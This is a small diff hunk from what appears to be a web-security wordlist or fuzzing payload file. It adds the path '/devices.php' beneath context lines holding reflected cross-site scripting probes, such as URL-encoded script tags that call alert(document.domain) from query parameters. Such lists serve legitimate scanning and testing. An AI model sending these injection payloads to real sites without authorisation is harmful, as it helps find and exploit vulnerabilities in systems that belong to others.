@@ -11169,3 +11169,4 @@ request?info=<svg onload=alert(
 {{params}}
 /?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/devices.php
